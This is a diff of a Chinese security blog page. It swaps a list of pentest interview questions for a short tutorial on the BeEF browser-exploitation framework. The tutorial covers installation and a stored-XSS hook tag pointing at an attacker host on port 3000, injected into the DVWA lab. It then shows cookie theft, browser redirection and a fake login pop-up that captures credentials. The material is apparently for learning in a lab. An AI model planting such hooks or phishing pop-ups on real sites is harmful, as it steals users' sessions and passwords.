@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Sunian&#39;s Blog</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Sunian&#39;s Blog">
+  <title>&#39;BeEF的使用&#39; | Sunian&#39;s Blog</title>
+  <meta name="keywords" content=" XSS ">
+  <meta name="description" content="&#39;BeEF的使用&#39; | Sunian&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简历素念，男，19岁 现读于某大专院校，汽修专业，自学web安全 专注于研究渗透测试方向 web安全，内网，硬件，社工等 联系方式QQ：3504078815 邮箱：lingyu195@gmail.com">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/imgss/touxiang.jpg" />
@@ -681,12 +681,55 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-beef的使用" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#记一次360笔试题"><span class="toc-text">记一次360笔试题</span></a></li></ol>
+        <h1 class="article-title">&#39;BeEF的使用&#39;</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="XSS">XSS</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color4">XSS</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-12-13 16:34:49'>2019-12-13 11:54</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#BeEF简介"><span class="toc-text">BeEF简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置"><span class="toc-text">安装配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单使用"><span class="toc-text">简单使用</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -699,33 +742,47 @@
     }
 </style>
 </div>
-            <h3 id="记一次360笔试题"><a href="#记一次360笔试题" class="headerlink" title="记一次360笔试题"></a>记一次360笔试题</h3><ol>
-<li><p>如果存在SQL注入怎么判断不同的数据库。</p>
-</li>
-<li><p>简述下浏览器的自解码机制。</p>
-</li>
-<li><p>拿到目标站怎么进行渗透，需要注意什么。</p>
-</li>
-<li><p>CSRF漏洞的原理是什么？怎么修复？</p>
-</li>
-<li><p>代码审计怎么做？</p>
-</li>
-<li><p>哪些漏洞是WAF不能防御的？请举出至少三类漏洞。</p>
-</li>
-<li><p>考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</p>
-</li>
-<li><p>PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</p>
-</li>
-<li><p>使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</p>
-</li>
-<li><p>渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</p>
-</li>
-</ol>
-<p>欢迎加入知识星球，获取参考答案及更多渗透资料<br><img src="/imgss/tu52.png" alt=""></p>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="BeEF简介"><a href="#BeEF简介" class="headerlink" title="BeEF简介"></a>BeEF简介</h3><p>1、Beef<br>生成、交付 paylaod<br>Ruby 语言编写<br>服务器端：管理 hooked 客户端<br>客户端：运行与客户端浏览器的 Javascript 脚本（hook）</p>
+<p>2、攻击手段<br>利用 xss 漏洞实现攻击<br>诱使客户端访问含有 hook 的伪造站点<br>结合中间人攻击注入 hook 脚本</p>
+<p>3、常见用途<br>键盘记录器<br>网络扫描<br>浏览器信息收集<br>绑定 shell<br>与 metasploit 集成</p>
+<h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>kali2中自带，菜单图标是一个蓝色公牛。kali4中没有BeEF，使用一键安装<br>sudo apt-get install beef-xss<br>vi /usr/share/beef-xss/config.yaml 修改下密码即可<br><img src="/imgss/u15.png" alt><br>./beef 或 nohup ./beef &amp; (放在后台运行)<br><img src="/imgss/u16.png" alt><br>输入IP:3000/ui/authentication进行登陆<br><img src="/imgss/u17.png" alt><br><img src="/imgss/u18.png" alt></p>
+<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>我们从DVWA插入代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://IP:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p><img src="/imgss/u19.png" alt></p>
+<p>beef这里就会返回一个主机，能够看到cookie，窗口标题、长、宽、referer、hostname、hostport等信息<br>(但是我这靶机明明是centos，检测是win10，搞不懂)<br><img src="/imgss/u20.png" alt><br>logs中是用户执行键盘鼠标的操作<br><img src="/imgss/u21.png" alt><br>commands中是一些功能性操作，如<br>1，获取cookie<br><img src="/imgss/u22.png" alt><br><img src="/imgss/u23.png" alt><br>2，网页重定向<br>Browser—&gt;Hooked Domain —&gt;Redirect Browser<br>相应的，我们的主机也下线了。。。。<br><img src="/imgss/u24.png" alt><br>3，社工弹窗<br>最下面Social Engiineering——&gt;Pretty Theft<br><img src="/imgss/u25.png" alt><br>用户则会收到一个弹窗，输入账号密码，点击login，我们这边将会收到账号密码<br><img src="/imgss/u26.png" alt><br><img src="/imgss/u27.png" alt></p>
+<p>具体利用等相关资料，推荐作者NT00，当前共6篇。<br><a href="https://www.freebuf.com/articles/web/175755.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/175755.html</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在QQ私聊我，也可以邮件至 lingyu195@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>&#39;BeEF的使用&#39;</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="素念">素念</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-13, 11:54:41</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-13, 16:34:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/13/beef的使用/" title="&#39;BeEF的使用&#39;">http://yoursite.com/2019/12/13/beef的使用/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 sunian</p>
